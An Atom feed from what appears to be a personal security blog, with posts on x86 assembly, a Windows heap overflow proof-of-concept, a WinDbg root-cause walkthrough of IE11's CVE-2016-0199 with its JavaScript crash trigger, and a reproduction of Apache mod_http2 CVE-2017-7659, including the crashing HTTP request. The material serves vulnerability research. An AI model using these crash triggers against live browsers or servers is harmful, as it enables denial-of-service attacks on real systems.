<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Bob1Bob2]]></title>
  <link href="http://wg135.github.io/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2018-05-24T12:58:12-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[C++ to Assembly]]></title>
    <link href="http://wg135.github.io/blog/2018/05/23/c-plus-plus-to-assembly/"/>
    <updated>2018-05-23T10:47:11-05:00</updated>
    <id>http://wg135.github.io/blog/2018/05/23/c-plus-plus-to-assembly</id>
    <content type="html"><![CDATA[<h2>0x0 start</h2>

<p>A simple code:</p>

<p><img src="http://wg135.github.io/images/blog/note/c2assembly/1.PNG" title="[title manually exploit [alt text]]" ></p>

<p>compile it and check its assembly:</p>

<p><img src="http://wg135.github.io/images/blog/note/c2assembly/2.PNG" title="[title manually exploit [alt text]]" ></p>

<p>two instructions:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.text:004116D0                 push    ebp
</span><span class='line'>.text:004116D1                 mov     ebp, esp
</span></code></pre></td></tr></table></div></figure>


<p>ebp saves current function (main function in this code) stack base address. When call another function, the process needs to use that function&rsquo;s stack space. So it will save current stack base address and assign esp to ebp. use [ebp +??] to access function&rsquo;s aguments and use [ebp - ??] to access function&rsquo;s variable.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.text:004116D3                 sub     esp, 0C0h
</span><span class='line'>.text:004116D9                 push    ebx
</span><span class='line'>.text:004116DA                 push    esi
</span><span class='line'>.text:004116DB                 push    edi
</span><span class='line'>.text:004116DC                 lea     edi, [ebp+var_C0]
</span><span class='line'>.text:004116E2                 mov     ecx, 30h
</span><span class='line'>.text:004116E7                 mov     eax, 0CCCCCCCCh
</span><span class='line'>.text:004116EC                 rep stosd</span></code></pre></td></tr></table></div></figure>


<p><code>sub     esp, 0C0h</code> will allocate a stack space,</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.text:004116D9                 push    ebx
</span><span class='line'>.text:004116DA                 push    esi
</span><span class='line'>.text:004116DB                 push    edi</span></code></pre></td></tr></table></div></figure>


<p>save these values.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.text:004116DC                 lea     edi, [ebp+var_C0]
</span><span class='line'>.text:004116E2                 mov     ecx, 30h
</span><span class='line'>.text:004116E7                 mov     eax, 0CCCCCCCCh
</span><span class='line'>.text:004116EC                 rep stosd</span></code></pre></td></tr></table></div></figure>


<p>rep is repeat these instructions. ECX is the time of these actions and assign these value as ccccc&hellip;, since this is debug version.</p>

<h2>0x1 Data Type</h2>

<h3>Float</h3>

<p>code:</p>

<p><img src="http://wg135.github.io/images/blog/note/c2assembly/3.PNG" title="[title manually exploit [alt text]]" ></p>

<p>Visual Studio 2015 assembly code:</p>

<p><img src="http://wg135.github.io/images/blog/note/c2assembly/4.PNG" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Heap Overflow]]></title>
    <link href="http://wg135.github.io/blog/2018/05/22/heap-overflow/"/>
    <updated>2018-05-22T15:11:44-05:00</updated>
    <id>http://wg135.github.io/blog/2018/05/22/heap-overflow</id>
    <content type="html"><![CDATA[<h3>0x0 Enviroment:</h3>

<ul>
<li>Windows 7 SP1 32-bit</li>
<li>Windbg</li>
</ul>


<!--more-->


<h3>0x1 POC (from vulnerability war):</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;windows.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span> <span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">HANDLE</span> <span class="n">hHeap</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">heap</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">str</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">hHeap</span> <span class="o">=</span> <span class="n">HeapCreate</span><span class="p">(</span><span class="n">HEAP_GENERATE_EXCEPTIONS</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">);</span>
</span><span class='line'>  <span class="n">getchar</span><span class="p">();</span>    <span class="c1">// halt, attach to process</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">heap</span> <span class="o">=</span> <span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hHeap</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;heap addr:0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">heap</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">heap</span><span class="p">,</span><span class="n">str</span><span class="p">);</span> <span class="c1">//  heap overflow</span>
</span><span class='line'>  <span class="n">HeapFree</span><span class="p">(</span><span class="n">hHeap</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">heap</span><span class="p">);</span>  <span class="c1">// crash</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">HeapDestroy</span><span class="p">(</span><span class="n">hHeap</span><span class="p">);</span>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CVE-2016-0199]]></title>
    <link href="http://wg135.github.io/blog/2018/05/15/cve-2016-0199/"/>
    <updated>2018-05-15T15:02:16-05:00</updated>
    <id>http://wg135.github.io/blog/2018/05/15/cve-2016-0199</id>
    <content type="html"><![CDATA[<h3>0x0 Enviroment:</h3>

<ul>
<li>Windows 7 SP1 32-bit</li>
<li>IE 11</li>
<li>Windbg</li>
</ul>


<!--more-->


<h3>0x1 POC:</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;X-UA-Compatible&quot;</span> <span class="na">content=</span><span class="s">&quot;IE=7&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;script&gt;</span>
</span><span class='line'><span class="nx">oElement</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;IMG&quot;</span><span class="p">);</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">oAttr</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createAttribute</span><span class="p">(</span><span class="s2">&quot;loop&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nx">oAttr</span><span class="p">.</span><span class="nx">nodeValue</span> <span class="o">=</span> <span class="nx">oElement</span><span class="p">;</span>
</span><span class='line'><span class="nx">oElement</span><span class="p">.</span><span class="nx">loop</span> <span class="o">=</span> <span class="mh">0x41424344</span><span class="p">;</span>
</span><span class='line'><span class="nx">oElement</span><span class="p">.</span><span class="nx">setAttributeNode</span><span class="p">(</span><span class="nx">oAttr</span><span class="p">);</span>
</span><span class='line'><span class="nx">oElement</span><span class="p">.</span><span class="nx">removeAttributeNode</span><span class="p">(</span><span class="nx">oAttr</span><span class="p">);</span>
</span><span class='line'><span class="nx">CollectGarbage</span><span class="p">();</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<h3>0x2 Vulnerability Reproduce</h3>

<p>Run the poc and get crash in windbg:</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/1.PNG" title="[title manually exploit [alt text]]" ></p>

<p>Here we get Access violation exception</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>jscript9!JavascriptThreadService::EnumerateTrackingClient+0x59252:
</span><span class='line'>695b0de2 8b30            mov     esi,dword ptr [eax]  ds:0023:41424344=????????
</span></code></pre></td></tr></table></div></figure>


<p>Next we need to locate this code in jscript9.dll in IDA Pro. The address is 0x695b0de2 and we need to get base address of this DLL:</p>

<p><code>lmvm jscript9</code></p>

<p>lmvm <module> - Dumps information about the module. Remember to use <module> and not &lt;module.dll>.</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/2.PNG" title="[title manually exploit [alt text]]" ></p>

<p>start address is 0x693b0000, so the address we want to check in IDA Pro is :</p>

<p><code>2:051&gt; ? 695b0de2 - 693b0000 + 10000000</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/3.PNG" title="[title manually exploit [alt text]]" ></p>

<p>so the address is 0x 10200de2.</p>

<p>In IDA Pro, locate the code:
<img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/4.PNG" title="[title manually exploit [alt text]]" ></p>

<p>based on the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>.text:10200DE2                 mov     esi, [eax]
</span><span class='line'>.text:10200DE4                 mov     ecx, [esi+44h]  ; void *
</span><span class='line'>.text:10200DE7                 call    ds:___guard_check_icall_fptr
</span><span class='line'>.text:10200DED                 call    dword ptr [esi+44h
</span></code></pre></td></tr></table></div></figure>


<p>we can guess, eax has C++ object base address and that address -4 should contain vtable address. To verifiy the assumption. Modify the PoC:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;X-UA-Compatible&quot;</span> <span class="na">content=</span><span class="s">&quot;IE=7&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;script&gt;</span>
</span><span class='line'><span class="nx">alert</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="nx">oElement</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;IMG&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">oAttr</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createAttribute</span><span class="p">(</span><span class="s2">&quot;loop&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nx">alert</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
</span><span class='line'><span class="nx">oAttr</span><span class="p">.</span><span class="nx">nodeValue</span> <span class="o">=</span> <span class="nx">oElement</span><span class="p">;</span>
</span><span class='line'><span class="nx">alert</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
</span><span class='line'><span class="nx">CollectGarbage</span><span class="p">();</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We want to set break point at jscript9!JavascriptThreadService::EnumerateTrackingClient+0x59252</p>

<p>however, since the dll is not loaded when we restart debugging. We can use windbg command <code>sxe ld:modulename</code> command to break when jscript9.dll first time load, and then we can set the breakpoint on that address.</p>

<p><code>sxe ld:jscript9</code>
<code>lmm jscript9</code>
<code>bp jscript9!JavascriptThreadService::EnumerateTrackingClient+0x59252</code>
<code>bl</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/5.PNG" title="[title manually exploit [alt text]]" ></p>

<p>As you can see, we get the vtable address.</p>

<p>Next rewrite the poc:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;X-UA-Compatible&quot;</span> <span class="na">content=</span><span class="s">&quot;IE=7&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;script&gt;</span>
</span><span class='line'><span class="nx">alert</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="nx">oElement</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;IMG&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">oAttr</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createAttribute</span><span class="p">(</span><span class="s2">&quot;loop&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nx">alert</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
</span><span class='line'><span class="nx">oAttr</span><span class="p">.</span><span class="nx">nodeValue</span> <span class="o">=</span> <span class="nx">oElement</span><span class="p">;</span>
</span><span class='line'><span class="nx">alert</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
</span><span class='line'><span class="nx">oElement</span><span class="p">.</span><span class="nx">loop</span> <span class="o">=</span> <span class="mh">0x41424344</span><span class="p">;</span>
</span><span class='line'><span class="nx">alert</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span>
</span><span class='line'><span class="nx">oElement</span><span class="p">.</span><span class="nx">setAttributeNode</span><span class="p">(</span><span class="nx">oAttr</span><span class="p">);</span>
</span><span class='line'><span class="nx">alert</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
</span><span class='line'><span class="nx">oElement</span><span class="p">.</span><span class="nx">removeAttributeNode</span><span class="p">(</span><span class="nx">oAttr</span><span class="p">);</span>
</span><span class='line'><span class="nx">alert</span><span class="p">(</span><span class="mi">6</span><span class="p">);</span>
</span><span class='line'><span class="nx">CollectGarbage</span><span class="p">();</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The poc create IMG object and attribute loop.So we need to find out these two addresss. First of all, set hpa and ust</p>

<p><code>gflags /i iexplore.exe +hpa +ust</code></p>

<p>Then use IE to open poc file, and attach to windbg,
<img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/7.PNG" title="[title manually exploit [alt text]]" ></p>

<p>and use <code>x MSHTML!CImgElement::*</code> to list all clmgelement functions</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/6.PNG" title="[title manually exploit [alt text]]" ></p>

<p>CreateElement function will create object. set breakpoint here and run</p>

<p><code>bp MSHTML!CImgElement::CreateElement; g</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/8.PNG" title="[title manually exploit [alt text]]" ></p>

<p>Click messagebox in webpage and we hit the breakpoint:</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/9.PNG" title="[title manually exploit [alt text]]" ></p>

<p>step in <code>p</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/10.PNG" title="[title manually exploit [alt text]]" ></p>

<p><code>p</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/11.PNG" title="[title manually exploit [alt text]]" ></p>

<p><code>p</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/12.PNG" title="[title manually exploit [alt text]]" ></p>

<p><code>p</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/13.PNG" title="[title manually exploit [alt text]]" ></p>

<p><code>p</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/14.PNG" title="[title manually exploit [alt text]]" ></p>

<p><code>p</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/15.PNG" title="[title manually exploit [alt text]]" ></p>

<p><code>p</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/16.PNG" title="[title manually exploit [alt text]]" ></p>

<p>HeapAlloc creates a buffer, size is 0x5c and the address is in eax, 0x0d524fa0.</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/17.PNG" title="[title manually exploit [alt text]]" ></p>

<p>Address 0x0d524fa0 will be IMG object&rsquo;s address. But why?</p>

<p>Keep going on</p>

<p>a few <code>p</code>s</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/18.PNG" title="[title manually exploit [alt text]]" ></p>

<p>since before calling MSHTML!CImgElement::CImgElement, ecx contains eax value 0d524fa0</p>

<p>Use <code>dps</code> command (display pointers and symbols):</p>

<p><code>dps 0d524fa0</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/19.PNG" title="[title manually exploit [alt text]]" ></p>

<p>This is vtable address.</p>

<p>next try to search Attribute object base address</p>

<p><code>MSHTML!CAttribute::*</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/20.PNG" title="[title manually exploit [alt text]]" ></p>

<p>It is a constructor function. Put a breakpoint here.</p>

<p><code>bp MSHTML!CAttribute::CAttribute</code></p>

<p>and <code>g</code>, will hit alert(1); in poc. click ok.</p>

<p>keep step in and reach here:</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/21.PNG" title="[title manually exploit [alt text]]" ></p>

<p>so attribute object base address in ebx and its value is 0x0d5a2fa0</p>

<p>so address of IMG is 0x0d524fa0 address of Attribute is 0x0d5a2fa0.</p>

<p>Back to PoC:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>oAttr.nodeValue = oElement;
</span></code></pre></td></tr></table></div></figure>


<p>This line will assign an IMG object to a memeber of the attribute object. Lets search which function can do this:</p>

<p><code>x MSHTML!CAttribute::*</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/22.PNG" title="[title manually exploit [alt text]]" ></p>

<p>seems <code>MSHTML!CAttribute::put_nodeValue</code> can do this. set the breakpoint:</p>

<p><code>bp MSHTML!CAttribute::put_nodeValue</code> and go</p>

<p>click ok</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/23.PNG" title="[title manually exploit [alt text]]" ></p>

<p>and we reach MSHTML!CAttribute::put_nodeValue:</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/24.PNG" title="[title manually exploit [alt text]]" ></p>

<p>check the call stack:</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/25.PNG" title="[title manually exploit [alt text]]" ></p>

<p>do <code>dps 0d5a2fa0</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/26.PNG" title="[title manually exploit [alt text]]" ></p>

<p>Seems the breakpoint is correct. put_nodeValue seems the entry of the assignment. Keep going.</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/27.PNG" title="[title manually exploit [alt text]]" ></p>

<p>use command <code>t</code> to trace down</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/37.PNG" title="[title manually exploit [alt text]]" ></p>

<p>do <code>dps 0d5a2fa0</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/28.PNG" title="[title manually exploit [alt text]]" ></p>

<p>now we  can see, IMG object address is copied to attribute object and offset is 0x30</p>

<p>next in POC:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>oElement.loop = 0x41424344;
</span></code></pre></td></tr></table></div></figure>


<p>We want to locate the address of this code, first of all,</p>

<p>do <code>s-d 0x0 L?0x7fffffff 41424344</code> to find the 41424344 and then execute the code and find the extra one, that should be the address of the 41424344 in the poc code.</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/29.PNG" title="[title manually exploit [alt text]]" ></p>

<p>then keep goin, press <code>g</code> and after alert(4) popup,</p>

<p>do <code>s-d 0x0 L?0x7fffffff 41424344</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/30.PNG" title="[title manually exploit [alt text]]" ></p>

<p>we have new address 0x14162fc8</p>

<p><code>!heap -p -a 14162fc8</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/31.PNG" title="[title manually exploit [alt text]]" ></p>

<p>we found useraddr is 14162fc0, so the memory is allocated from 14162fc0 and 41424344' address is 8 bytes behind it.</p>

<p>set bp</p>

<p><code>bp MSHTML!CImplAry::EnsureSizeWorker+0x00000063</code></p>

<p>HeapAlloc assign memory, the address is 12fd1fc0</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/32.PNG" title="[title manually exploit [alt text]]" ></p>

<p>step in and check edi:</p>

<p><code>dps edi</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/33.PNG" title="[title manually exploit [alt text]]" ></p>

<p>now remember IMG object address is 0x0d524fa0</p>

<p>the whole process is :</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/34.png" title="[title manually exploit [alt text]]" ></p>

<p>back to POC:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>oElement.setAttributeNode(oAttr);
</span></code></pre></td></tr></table></div></figure>


<p>do <code>x mshtml!CElement::setAttributeNode</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/35.PNG" title="[title manually exploit [alt text]]" ></p>

<p>set bp:
<code>bp mshtml!CElement::setAttributeNode</code></p>

<p>and finally got:</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2016_0199/36.PNG" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CVE-2017-7659 Apache Vulnerability Reproduce]]></title>
    <link href="http://wg135.github.io/blog/2017/07/18/cve-2017-7659-apache-vulnerability-reproduce/"/>
    <updated>2017-07-18T10:41:52-05:00</updated>
    <id>http://wg135.github.io/blog/2017/07/18/cve-2017-7659-apache-vulnerability-reproduce</id>
    <content type="html"><![CDATA[<p>Apache released fix for CVE-2017-7659 last month. It is a mod_http2 Null Pointer Dereference vulnerability. Here is my analysis.</p>

<!--more-->


<p>First check the patch for this vulnerability:</p>

<p><code>https://github.com/apache/httpd/commit/672187c168b94b562d8065e08e2cad5b00cdd0e3</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2017_7659/Capture1.PNG" title="[title manually exploit [alt text]]" ></p>

<p>As we can see, fix just add check return value of function h2_request_rcreate.</p>

<h2>reproduce:</h2>

<p>First, download apache version 2.4.25: <a href="https://archive.apache.org/dist/httpd/httpd-2.4.25.tar.gz.">https://archive.apache.org/dist/httpd/httpd-2.4.25.tar.gz.</a> compile it and enable http2. I wrote a bash script to do download and configure it. After that use curl to verify if http2 is ready to go</p>

<p><code>curl -v --http2 http://192.168.79.136</code></p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2017_7659/Capture2.PNG" title="[title manually exploit [alt text]]" ></p>

<p>when you see HTTP/1.1 101 Switching Protocols, that means http2 is good to go.</p>

<p>now in burp send http request:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET / HTTP/1.0
</span><span class='line'>User-Agent: curl/7.47.0
</span><span class='line'>Accept: */*
</span><span class='line'>Connection: Upgrade, HTTP2-Settings
</span><span class='line'>Upgrade: h2c
</span><span class='line'>HTTP2-Settings: AAMAAABkAAQAAP__</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2017_7659/Capture3.PNG" title="[title manually exploit [alt text]]" ></p>

<p>The server doesn&rsquo;t response.</p>

<h2>Analysis</h2>

<p>First check vulnerable function h2_stream_set_request_rec (in httpd-2.4.25/modules/http2/h2_stream.c)</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2017_7659/Capture4.PNG" title="[title manually exploit [alt text]]" ></p>

<p>function h2_stream_set_request_rec calls h2_request_rcreat is used to create http 2.0 request. req will be null when h2_request_rcreat fails.
In this situation, log function ap_log_rerror will use req which leads process crash.</p>

<p>next, exam function h2_request_rcreate (in httpd-2.4.25/modules/http2/h2_request.c).</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2017_7659/Capture5.PNG" title="[title manually exploit [alt text]]" ></p>

<p>it will set req vaule as NULL, then it will check value of r->method, scheme, r->hostname, path. If any of them is null will return fail. However, at this moment, req vaule is 0 which leads to crash.</p>

<p>Method, scheme and path are checked. So r->hostname is our winner.</p>

<p>in HTTP request, there are two methods can have host name.</p>

<p>(1) in URL. Like: <a href="http://fuckyou.com/shit.html.">http://fuckyou.com/shit.html.</a> Function ap_parse_uri will handle host value in this request.
(2) in HTTP header. Function fix_hostname will handle this.</p>

<p>check function ap_read_request (in httpd-2.4.25/server/protocol.c)</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2017_7659/Capture6.PNG" title="[title manually exploit [alt text]]" ></p>

<p>if r->hostname is empty and http request version is great than 1.1 or http version == 0 without host will return http400. But it doesn&rsquo;t check one situation: when http version is 1.0 and without hostname value. That is the problem.</p>

<h2>Debug</h2>

<p>See reference how to debug apache: <a href="https://httpd.apache.org/dev/debugging.html">https://httpd.apache.org/dev/debugging.html</a></p>

<p>set break point in function ap_read_request,</p>

<p>run the poc. it will hit break point at ap_read_request, h2_stream_set_request_rec</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2017_7659/Capture7.PNG" title="[title manually exploit [alt text]]" ></p>

<p>continue, it will hit break point at h2_stream_set_request_rec</p>

<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2017_7659/Capture8.PNG" title="[title manually exploit [alt text]]" ></p>

<p>as we can see, it is in mod_http2.so.</p>

<p>(not finish)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[beEF and metasploit]]></title>
    <link href="http://wg135.github.io/blog/2017/06/26/beef-and-metasploit/"/>
    <updated>2017-06-26T16:09:40-05:00</updated>
